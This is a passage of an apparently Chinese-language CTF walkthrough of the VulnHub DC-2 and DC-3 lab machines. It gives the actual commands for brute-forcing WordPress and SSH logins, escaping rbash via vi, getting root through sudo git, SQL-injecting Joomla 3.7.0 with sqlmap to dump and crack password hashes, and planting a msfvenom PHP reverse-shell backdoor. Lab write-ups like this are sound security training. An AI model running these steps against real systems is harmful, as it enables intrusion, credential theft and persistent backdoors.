<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831221151099.png"><img src="/vulnhub/image-20220831221151099.png" alt="image-20220831221151099"></a></p>
<p>发现是生成对应网站的密码字典</p>
<p><code>flag1</code>整理信息好像差不多了，下面我们利用<code>dc1</code>提到的<code>wappalyzer</code>，查看一下网页的框架结构有没有什么线索</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831221945690.png"><img src="/vulnhub/image-20220831221945690.png" alt="image-20220831221945690"></a></p>
<p>发现网站的<code>CMS</code>是<code>WordPress</code>，还可以看到它的主题是<code>Twenty Seventeen</code></p>
<p>那<code>wordpress</code>，有没有什么漏洞可以供我们利用呢，下面就提及另一个工具</p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><blockquote>
<p><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞</code></p>
</blockquote>
<p>于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下</p>
<blockquote>
<p>输入<code>wpscan --url http://dc-2 -e u</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831223359965.png"><img src="/vulnhub/image-20220831223359965.png" alt="image-20220831223359965"></a></p>
<p>然后往下看用户名</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831223432802.png"><img src="/vulnhub/image-20220831223432802.png" alt="image-20220831223432802"></a></p>
<p>发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的<code>pass.txt</code>这个密码本一样</p>
<blockquote>
<p>输入<code>vi un.txt</code></p>
<p>把<code>admin</code> <code>jerry</code> <code>tom</code>复制进去</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831223714569.png"><img src="/vulnhub/image-20220831223714569.png" alt="image-20220831223714569"></a></p>
<p>然后就可以结合我们的密码文本和用户名文本，利用<code>wpscan</code>这个工具，进行爆破操作了</p>
<blockquote>
<p>输入<code>wpscan --url http://dc-2 -P pass.txt -U un.txt</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831223950721.png"><img src="/vulnhub/image-20220831223950721.png" alt="image-20220831223950721"></a></p>
<p>稍微等一会</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831224205560.png"><img src="/vulnhub/image-20220831224205560.png" alt="image-20220831224205560"></a></p>
<p><code>admin</code>用户密码没有找到，应该是最高权限的账号</p>
<p>但是<code>jerry</code>和<code>tom</code>用户的密码已经知道了</p>
<p>下面，我们就要开始找登录的页面了，一般是后台网站</p>
<p>我们可以用<code>dirsearch</code>工具进行扫描看看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831224818079.png"><img src="/vulnhub/image-20220831224818079.png" alt="image-20220831224818079"></a></p>
<p>发现网站</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831224833915.png"><img src="/vulnhub/image-20220831224833915.png" alt="image-20220831224833915"></a></p>
<p>用我们之前获得的用户名和密码登录试试</p>
<p>以<code>jerry</code>为例，好像用<code>tom</code>会显示密码错误</p>
<p>在<code>page</code>窗口发现<code>flag2</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831225233262.png"><img src="/vulnhub/image-20220831225233262.png" alt="image-20220831225233262"></a></p>
<p>点开查看，得到flag2</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831225256842.png"><img src="/vulnhub/image-20220831225256842.png" alt="image-20220831225256842"></a></p>
<blockquote>
<p><code>Flag 2:</code></p>
<p><code>If you can&#39;t exploit WordPress and take a shortcut, there is another way.</code></p>
<p><code>Hope you found another entry point.</code><br>意思是：<br>如果你不能利用WordPress并走捷径，还有另一种方法。</p>
<p>希望你能找到另一个切入点。 </p>
</blockquote>
<hr>
<h2 id="Flag3-1"><a href="#Flag3-1" class="headerlink" title="Flag3"></a>Flag3</h2><p>根据<code>flag2</code>的提示，实际上就是说从<code>wordpress</code>这条路是行不通的，要从另外的方向</p>
<p>但是如果<code>wordpress</code>行不通，而这个网站就是<code>wordpress</code>搭建起来的，那么这个网站的就不能下手</p>
<p>虽然网站的<code>80</code>端口的<code>http</code>行不通</p>
<p>但是我们之前用<code>nmap</code>扫了一下，发现端口<code>7744</code>运行着<code>ssh</code>，那我们能不能利用<code>ssh</code>登录成功呢</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831205550715.png"><img src="/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></a></p>
<p>我们先用之前用过的工具<code>hydra</code>进行爆破一下，看看这个<code>ssh</code>的用户是谁</p>
<blockquote>
<p>输入<code>hydra -l un.txt -P pass.txt 192.168.133.138 ssh -s 7744</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831230552544.png"><img src="/vulnhub/image-20220831230552544.png" alt="image-20220831230552544"></a></p>
<p>发现<code>tom</code>账号是在这里登录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831231405322.png"><img src="/vulnhub/image-20220831231405322.png" alt="image-20220831231405322"></a></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入ssh <span class="symbol">tom@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.138</span> -p <span class="number">7744</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831231449571.png"><img src="/vulnhub/image-20220831231449571.png" alt="image-20220831231449571"></a></p>
<p>登录成功后，<code>ls</code>发现<code>flag3.txt</code></p>
<blockquote>
<p>输入<code>cat flag3.txt</code>，查看内容</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831231634426.png"><img src="/vulnhub/image-20220831231634426.png" alt="image-20220831231634426"></a></p>
<p>发现没有该命令，那就可能是没有权限执行这个命令了</p>
<h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>看到<code>rbash</code>，不认识，查一下</p>
<blockquote>
<p><code>rbash</code><br>它与一般shell的区别在于会限制一些行为，让一些命令无法执行</p>
</blockquote>
<p>看来是限制了我们的命令，但我们还是得知道我们目前还能用那些命令，之前使用过<code>ls</code>，所以<code>ls</code>可以使用</p>
<blockquote>
<p>输入<code>ls /home/tom/usr/bin</code>   </p>
<p>&#x2F;&#x2F;查看rbash设置的可执行的命令</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831232504736.png"><img src="/vulnhub/image-20220831232504736.png" alt="image-20220831232504736"></a></p>
<p>我们可以看到我们可以利用</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">less <span class="keyword">ls</span> scp <span class="keyword">vi</span></span><br></pre></td></tr></table></figure>

<p>关键是<code>vi</code>的命令</p>
<h3 id="vi绕过-rbash逃逸"><a href="#vi绕过-rbash逃逸" class="headerlink" title="*vi绕过-&gt;rbash逃逸"></a>*vi绕过-&gt;rbash逃逸</h3><p>可以进入<code>vi</code>中，执行<code>set</code>命令，把<code>shell</code>改为<code>/bin/sh</code></p>
<blockquote>
<p> 先输入<code>vi</code>，进入<code>vi</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831233127692.png"><img src="/vulnhub/image-20220831233127692.png" alt="image-20220831233127692"></a></p>
<p>然后</p>
<blockquote>
<p>直接输入，<strong>不用按i</strong><br><code>:set shell=/bin/sh</code>    &#x2F;&#x2F;给shell赋值<br>回车<br><code>:shell</code>                &#x2F;&#x2F;执行shell<br>回车，就退回主界面来了</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831233626801.png"><img src="/vulnhub/image-20220831233626801.png" alt="image-20220831233626801"></a></p>
<p>这样我们就完成了逃逸</p>
<p>之前因为我们受限于<code>rbash</code>，不能执行<code>cd</code>等命令</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831233814113.png"><img src="/vulnhub/image-20220831233814113.png" alt="image-20220831233814113"></a></p>
<p>现在执行试试</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831234028674.png"><img src="/vulnhub/image-20220831234028674.png" alt="image-20220831234028674"></a></p>
<p>就没有阻止了</p>
<p>我们再试试<code>cat</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831234235801.png"><img src="/vulnhub/image-20220831234235801.png" alt="image-20220831234235801"></a></p>
<p>发现<code>cat</code>命令找不到，但是我们已经绕过了<code>rbash</code>，所以只能是其他原因，最有可能就是<code>cat</code>的环境没有设置到当前位置</p>
<blockquote>
<p>输入<code>echo $PATH</code><br>这是显示当前环境变量，可能cat并没有被设置到当前的环境变量所以无法执行</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831234423827.png"><img src="/vulnhub/image-20220831234423827.png" alt="image-20220831234423827"></a></p>
<h3 id="设置全局变量"><a href="#设置全局变量" class="headerlink" title="*设置全局变量"></a>*设置全局变量</h3><blockquote>
<p>于是我们来设置全局变量,终端输入<br><code>export PATH=PATH:/usr/local/sbin:/usr/local/bin:usr/sbin:/usr/bin:/bin:sbin</code></p>
</blockquote>
<p>这样我们执行<code>cat</code>就不会只在<code>/home/tom/usr/bin</code>里面寻找了，会在很多目录里寻找</p>
<blockquote>
<p>输入</p>
<p><code>cd tom</code><br><code>ls</code><br><code>cat flag3.txt</code><br>得到flag3</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831235038373.png"><img src="/vulnhub/image-20220831235038373.png" alt="image-20220831235038373"></a></p>
<blockquote>
<p><code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</code><br>意思是：</p>
<p>可怜的老汤姆总是在追杰瑞。也许他应该为他造成的所有压力负责。</p>
<p>但是看到了su，也就是需要切换用户</p>
</blockquote>
<hr>
<h2 id="Flag4-1"><a href="#Flag4-1" class="headerlink" title="Flag4"></a>Flag4</h2><p>根据<code>flag3</code>，我们可以知道需要用<code>su</code>命令切换用户到<code>jerry</code></p>
<blockquote>
<p>输入<code>su jerry</code>和其密码<code>adipiscing</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901094337288.png"><img src="/vulnhub/image-20220901094337288.png" alt="image-20220901094337288"></a></p>
<p>然后切换到<code>jerry</code>目录，发现<code>flag4.txt</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901094512382.png"><img src="/vulnhub/image-20220901094512382.png" alt="image-20220901094512382"></a></p>
<blockquote>
<p><code>Good to see that you&#39;ve made it this far - but you&#39;re not home yet.</code> </p>
<p><code>You still need to get the final flag (the only flag that really counts!!!).</code>  </p>
<p><code>No hints here - you&#39;re on your own now.  :-)</code></p>
<p><code>Go on - git outta here!!!!</code><br>意思是：<br>很高兴看到你走了这么远，但你还没回家。<br>你仍然需要得到最后的标志（唯一真正重要的标志！！！）。<br>这里没有提示-你现在只能靠自己了。：-）</p>
<p>去吧-滚出去！！！！</p>
<p>看到git，就是提示我们用git命令</p>
</blockquote>
<hr>
<h2 id="Flag5-1"><a href="#Flag5-1" class="headerlink" title="Flag5"></a>Flag5</h2><h3 id="git缓存区溢出漏洞"><a href="#git缓存区溢出漏洞" class="headerlink" title="*git缓存区溢出漏洞"></a>*git缓存区溢出漏洞</h3><blockquote>
<p>输入<code>sudo -l</code><br>&#x2F;&#x2F;列出目前用户可执行与无法执行的指令。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901112624228.png"><img src="/vulnhub/image-20220901112624228.png" alt="image-20220901112624228"></a></p>
<p><u>就可以发现root以<code>nopasswd</code>【不需要密码】运行<code>git</code>命令</u></p>
<p>原理是<code>git</code>存在缓存区溢出漏洞，</p>
<p>在使用</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>不需要输入<code>root</code>密码，即可以<code>root</code>身份执行这条命令</p>
<p>操作如下</p>
<blockquote>
<p><code>sudo git -p</code>    </p>
<p>&#x2F;&#x2F;-p是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令</p>
</blockquote>
<p>下面可以看看区别</p>
<h4 id="注意窗口大小"><a href="#注意窗口大小" class="headerlink" title="*注意窗口大小"></a>*注意窗口大小</h4><h5 id="1-窗口足够大"><a href="#1-窗口足够大" class="headerlink" title="1.窗口足够大"></a>1.窗口足够大</h5><p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901113721300.png"><img src="/vulnhub/image-20220901113721300.png" alt="image-20220901113721300"></a></p>
<p>可以看到显示完了，就又回到原处了【不行】</p>
<h5 id="2-窗口小一些"><a href="#2-窗口小一些" class="headerlink" title="2.窗口小一些"></a>2.窗口小一些</h5><p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901113851826.png"><img src="/vulnhub/image-20220901113851826.png" alt="image-20220901113851826"></a></p>
<p>下方就显示出:，等待输入</p>
<blockquote>
<p>冒号<code>:</code>是自带有的，不是输入的<br><code>:!/bin/sh</code></p>
<p>&#x2F;&#x2F;感叹号!是shell转义字符，所以要避免sudo授权用户使用<code>vi，vim，ftp，lee，more，git</code><br><code>进入root</code></p>
<p><code>cd /root</code></p>
<p>当然也可以执行<code>:!passwd root</code><br>修改其密码<br>然后<code>su root</code>登录也可</p>
</blockquote>
<h3 id="法-1-执行命令，拿到root的shell"><a href="#法-1-执行命令，拿到root的shell" class="headerlink" title="法 1.执行命令，拿到root的shell"></a>法 1.执行命令，拿到root的shell</h3><p><code>$</code>变成<code>#</code>成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901114902493.png"><img src="/vulnhub/image-20220901114902493.png" alt="image-20220901114902493"></a></p>
<h3 id="法-2-修改密码，登录"><a href="#法-2-修改密码，登录" class="headerlink" title="法 2.修改密码，登录"></a>法 2.修改密码，登录</h3><p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901114453769.png"><img src="/vulnhub/image-20220901114453769.png" alt="image-20220901114453769"></a></p>
<p><code>$</code>变成<code>#</code>，成功登录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901114726423.png"><img src="/vulnhub/image-20220901114726423.png" alt="image-20220901114726423"></a></p>
<p>然后到<code>/root</code>目录下，找到最后的 <code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901115306177.png"><img src="/vulnhub/image-20220901115306177.png" alt="image-20220901115306177"></a></p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">__    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___|<span class="string"> </span>|<span class="string"> </span>|<span class="string">   __</span>|<span class="string"> </span>|<span class="string"> ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ </span>|<span class="string"> </span>|<span class="string">  / _` </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___\/   </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Congratulatons!!!</code></p>
<p><code>A special thanks to all those who sent me tweets</code><br><code>and provided me with feedback - it&#39;s all greatly</code><br><code>appreciated.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code><br>意思是：</p>
<p>恭喜！！！</p>
<p>特别感谢所有给我发推文的人</p>
<p>并向我提供了反馈-非常棒<br>谢谢。</p>
<p>如果您喜欢这个CTF，请通过@DCAU7给我发一条推文</p>
</blockquote>
<p><strong>5个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="三、DC-3-初级"><a href="#三、DC-3-初级" class="headerlink" title="三、DC-3[初级]"></a>三、DC-3[初级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>【前面的靶机<code>ip</code>寻找，按之前的步骤即可】</p>
<p>先用<code>nmap</code>扫一下我们的靶机<code>ip</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902123406584.png"><img src="/vulnhub/image-20220902123406584.png" alt="image-20220902123406584"></a></p>
<p>看到只有<code>80</code>端口，运行着一个<code>http</code>服务，中间件为<code>apache2.4.18</code></p>
<p>内容管理系统（<code>CMS</code>）是<code>joomla</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902123056590.png"><img src="/vulnhub/image-20220902123056590.png" alt="image-20220902123056590"></a></p>
<p>利用插件<code>wappalyzer</code>，也可以看到其<code>CMS</code>为<code>joomla</code></p>
<p>我们可以利用<code>kali</code>包当中自带的<code>joomscan</code>工具对其进行扫描</p>
<blockquote>
<p>漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。还能够以HTML或文本格式导出扫描报告。</p>
</blockquote>
<p>【没有的，可能需要更新包，然后直接下载即可】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902185529785.png"><img src="/vulnhub/image-20220902185529785.png" alt="image-20220902185529785"></a></p>
<blockquote>
<p>输入<code>joomscan -u 192.168.133.139</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902185954570.png"><img src="/vulnhub/image-20220902185954570.png" alt="image-20220902185954570"></a></p>
<p>扫描发现了，管理员的登录网址<code>http://192.168.133.139/administrator/</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902190312468.png"><img src="/vulnhub/image-20220902190312468.png" alt="image-20220902190312468"></a></p>
<p>但是不知道用户名和密码</p>
<hr>
<p>发现其<code>joomla</code>版本为<code>3.7.0</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902194849302.png"><img src="/vulnhub/image-20220902194849302.png" alt="image-20220902194849302"></a></p>
<p>但我们并不知道该版本有哪些漏洞，所以需要用到 <code>kali</code>的<code>Exploit-DB</code>工具</p>
<p>可以在浏览器里的<code>Exploit-DB</code>网址进行查询【不过因为是国外网址有点卡】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902195723987.png"><img src="/vulnhub/image-20220902195723987.png" alt="image-20220902195723987"></a></p>
<p>然后寻找下载payload</p>
<hr>
<p>也可以在终端输入命令查询【也是基于<code>Exploit-DB</code>的命令行搜索工具,可以帮助我们查找渗透模块】</p>
<blockquote>
<p>输入<code>searchsploit joomla 3.7.0</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903084826356.png"><img src="/vulnhub/image-20220903084826356.png" alt="image-20220903084826356"></a></p>
<p>可以看到<code>joomla 3.7.0</code>版本存在<code>sql注入</code>的漏洞</p>
<p> 然后查看<code>Path</code></p>
<blockquote>
<p>输入<code>searchsploit -p 42033</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903124805721.png"><img src="/vulnhub/image-20220903124805721.png" alt="image-20220903124805721"></a></p>
<p><code>Path</code>就是该漏洞利用方法的文本地址</p>
<blockquote>
<p>输入<code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903125053542.png"><img src="/vulnhub/image-20220903125053542.png" alt="image-20220903125053542"></a></p>
<p>可以看到该漏洞的测试平台，时间，还有漏洞的<code>CVE</code>编号</p>
<p>关键在它给出的<code>sqlmap</code>注入的模板</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p>
<p>&#x2F;&#x2F;把localhost改成靶机ip即可</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903125630036.png"><img src="/vulnhub/image-20220903125630036.png" alt="image-20220903125630036"></a></p>
<p>运行</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903125921853.png"><img src="/vulnhub/image-20220903125921853.png" alt="image-20220903125921853"></a></p>
<p>发现了靶机下的数据库，我们所需要的就是<code>joomladb</code></p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</code></p>
<p>&#x2F;&#x2F;在原有的payload后加上-D joomladb，选定数据库<br>&#x2F;&#x2F;再在后面加上–tables，输出该数据库的表</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903130545749.png"><img src="/vulnhub/image-20220903130545749.png" alt="image-20220903130545749"></a></p>
<p>然后可以看到<code>#__users</code>的表，里面很可能有线索</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; --columns</code></p>
<p>&#x2F;&#x2F;和上一步类似，但注意表名有#，所以需要用引号框起来，不然后面语句全被注释了<br>&#x2F;&#x2F;*注，sqlmap提示按默认推荐就好</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903131111592.png"><img src="/vulnhub/image-20220903131111592.png" alt="image-20220903131111592"></a></p>
<p>看到<code>username</code>和<code>password</code>，查看列里内容</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C username,password --dump</code><br>&#x2F;&#x2F;dump获取字段中的数据</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903133516906.png"><img src="/vulnhub/image-20220903133516906.png" alt="image-20220903133516906"></a></p>
<p>得到用户名和密码</p>
<p>但是密码被加密了，那就只能用一些工具进行解密</p>
<p>先生成一个加密密码的文本文件</p>
<blockquote>
<p>输入<code>vi passwd.txt</code><br>然后把加密数据复制进去<br><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903134307088.png"><img src="/vulnhub/image-20220903134307088.png" alt="image-20220903134307088"></a></p>
<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>然后我们就需要用一个解密工具<code>john</code></p>
<p><code>John</code>是一个破解系统密码的工具</p>
<p>使用很简单</p>
<blockquote>
<p>输入<code>john passwd.txt</code></p>
<p>&#x2F;&#x2F;后面接的是密码文本文件</p>
</blockquote>
<p>然后输入</p>
<blockquote>
<p><code>john --show passwd.txt</code><br>&#x2F;&#x2F;查看爆破成功的密码，发现爆破成功</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903140126704.png"><img src="/vulnhub/image-20220903140126704.png" alt="image-20220903140126704"></a></p>
<p>得到密码<code>snoopy</code></p>
<p>然后登录后台网址</p>
<blockquote>
<p>用户名：<code>admin</code><br>密码：<code>snoopy</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903140604935.png"><img src="/vulnhub/image-20220903140604935.png" alt="image-20220903140604935"></a></p>
<p>登录成功，然后摸索分析一下网站</p>
<p>然后在<code>Extensions</code>–&gt;<code>Template</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903142609240.png"><img src="/vulnhub/image-20220903142609240.png" alt="image-20220903142609240"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903142440563.png"><img src="/vulnhub/image-20220903142440563.png" alt="image-20220903142440563"></a></p>
<p>发现有个<code>new file</code>，可以新建文件，那么我们也可以新建一个我们的木马文件，拿取靶机的<code>shell</code></p>
<h2 id="后门生成，进入shell"><a href="#后门生成，进入shell" class="headerlink" title="后门生成，进入shell"></a>后门生成，进入shell</h2><h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p><strong>msfvenom</strong></p>
<h4 id="msf生成木马"><a href="#msf生成木马" class="headerlink" title="msf生成木马"></a>msf生成木马</h4><blockquote>
<p>输入<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=kali的ip LPORT=4444 -f raw &gt; shell.php</code><br>&#x2F;&#x2F;注意，LHOST是kali的ip</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903222910397.png"><img src="/vulnhub/image-20220903222910397.png" alt="image-20220903222910397"></a></p>
<blockquote>
<p>输入<code>ls</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903144052531.png"><img src="/vulnhub/image-20220903144052531.png" alt="image-20220903144052531"></a></p>
<p>发现目录下生成了 <code>shell.php</code></p>
<blockquote>
<p>输入<code>cat shell.php</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903223007361.png"><img src="/vulnhub/image-20220903223007361.png" alt="image-20220903223007361"></a></p>
<p>得到靶机对应的木马</p>
<p>然后在网站新建一个<code>php</code>文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903221145987.png"><img src="/vulnhub/image-20220903221145987.png" alt="image-20220903221145987"></a></p>
<p>然后把木马内容导入进去</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903223039265.png"><img src="/vulnhub/image-20220903223039265.png" alt="image-20220903223039265"></a></p>
<p> 然后保存一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903221243628.png"><img src="/vulnhub/image-20220903221243628.png" alt="image-20220903221243628"></a></p>
<p>然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功</p>
<p>因为我们文件是在<code>/templates/protostar/</code>下上传的，所以访问</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903221340927.png"><img src="/vulnhub/image-20220903221340927.png" alt="image-20220903221340927"></a></p>
<p>看到<code>/*</code>，看来是可以成功访问</p>
<h5 id="msf利用木马"><a href="#msf利用木马" class="headerlink" title="msf利用木马"></a>msf利用木马</h5><p>然后用<code>msf</code>进行利用</p>
<blockquote>
<p>先输入<code>msfconsole</code>，进入msf</p>
</blockquote>
<blockquote>
<p>然后输入<br><code>use exploit/multi/handler</code></p>
<p><code>set payload php/meterpreter/reverse_tcp</code><br>进入我们利用msf制作的木马利用环境</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903220102252.png"><img src="/vulnhub/image-20220903220102252.png" alt="image-20220903220102252"></a></p>
<blockquote>
<p>输入<code>show options</code><br>看看需要填写什么</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903220250819.png"><img src="/vulnhub/image-20220903220250819.png" alt="image-20220903220250819"></a></p>
<p>看到LHOST监听的ip没有填写</p>
<blockquote>
<p>输入<code>set LHOST 192.168.133.140</code>  &#x2F;&#x2F;kali的ip</p>
</blockquote>
<blockquote>
<p>输入<code>run</code>，运行</p>
</blockquote>
<p>这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903223440029.png"><img src="/vulnhub/image-20220903223440029.png" alt="image-20220903223440029"></a></p>
<p>然后输入</p>
<blockquote>
<p>输入<code>shell</code></p>
<p>然后输入<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>&#x2F;&#x2F;进入交互式shell，当然不嫌看着麻烦，也可以直接执行后面命令</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903223812256.png"><img src="/vulnhub/image-20220903223812256.png" alt="image-20220903223812256"></a></p>
<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><blockquote>
<p>输入<code>ls</code>,简单看看文件</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903224116654.png"><img src="/vulnhub/image-20220903224116654.png" alt="image-20220903224116654"></a></p>
<blockquote>
<p>输入<code>uname -a</code><br>查看系统版本</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904082811177.png"><img src="/vulnhub/image-20220904082811177.png" alt="image-20220904082811177"></a></p>
<p>看到<code>unbuntu</code>是<code>2016</code>年<code>4</code>月发布的，所以是<code>unbuntu16.04</code></p>
<p><code>linux</code>版本是<code>4.4.0-21</code>版</p>
